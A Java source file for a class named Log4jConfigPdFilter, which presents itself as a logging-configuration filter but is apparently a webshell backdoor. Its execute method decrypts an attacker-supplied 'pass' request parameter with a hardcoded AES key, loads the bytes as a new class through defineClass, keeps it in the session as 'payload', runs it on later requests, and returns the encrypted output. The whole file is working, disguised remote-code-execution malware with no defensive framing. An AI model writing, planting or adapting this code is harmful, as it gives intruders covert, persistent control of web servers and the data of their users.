package com.filter;

import java.lang.reflect.Method;

public class Log4jConfigPdFilter extends ClassLoader{

    private static final java.util.Map<ClassLoader, Log4jConfigPdFilter> CACHE = new java.util.concurrent.ConcurrentHashMap<>();


    public static Log4jConfigPdFilter getInstance(ClassLoader loader) {
        return CACHE.computeIfAbsent(loader, k -> new Log4jConfigPdFilter(loader));
    }

    public static String md5;
    static String pass = "pass";
    static String key = md5("123456").substring(0, 16).toLowerCase();

    public Log4jConfigPdFilter() {
    }

    public Log4jConfigPdFilter(ClassLoader z) {
        super(z);
        md5 = md5(pass + key);
    }



    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;

        try {
            java.security.MessageDigest m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new java.math.BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        try {
            Class base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
            value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
        } catch (Exception var6) {
            try {
                Class base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }


    public Class Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public void execute(Object requestObj,  Object responseObj) {
        System.out.println("into execute()");
        try {
            // Use reflection to access session
            Class<?> reqClass = requestObj.getClass();
            Class<?> resClass = responseObj.getClass();
            Method getSession = reqClass.getMethod("getSession");
            Object sessionClass = getSession.invoke(requestObj);

            java.lang.reflect.Method getParam = reqClass.getMethod("getParameter", String.class);
            byte[] data = this.base64Decode((String)getParam.invoke(requestObj, pass));
            data = this.x(data, false);

            java.lang.reflect.Method getAttr = sessionClass.getClass().getMethod("getAttribute", String.class);
            Object payload = getAttr.invoke(sessionClass, "payload");

            if (payload == null) {
                java.lang.reflect.Method setAttr = sessionClass.getClass().getMethod("setAttribute", String.class, Object.class);
                setAttr.invoke(sessionClass, "payload", (new Log4jConfigPdFilter(reqClass.getClass().getClassLoader())).Q(data));
            } else {
                java.lang.reflect.Method setReqAttr = reqClass.getMethod("setAttribute", String.class, Object.class);
                setReqAttr.invoke(requestObj, "parameters", data);

                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                Object f = ((Class<?>)payload).newInstance();
                f.equals(arrOut);
                f.equals(requestObj);

                java.lang.reflect.Method getOutputStream = resClass.getMethod("getOutputStream");
                Object out = getOutputStream.invoke(responseObj);
                java.lang.reflect.Method write = out.getClass().getMethod("write", byte[].class);

                write.invoke(out, md5.substring(0, 16).getBytes(java.nio.charset.StandardCharsets.UTF_8));
                f.toString();
                write.invoke(out, base64Encode(this.x(arrOut.toByteArray(), true)).getBytes(java.nio.charset.StandardCharsets.UTF_8));
                write.invoke(out, md5.substring(16).getBytes(java.nio.charset.StandardCharsets.UTF_8));

                java.lang.reflect.Method flush = out.getClass().getMethod("flush");
                flush.invoke(out);
            }
        } catch (Exception var12) {
            var12.printStackTrace();
        }

    }


    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
            return (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }

    static {
        md5 = md5(pass + key);
    }
}
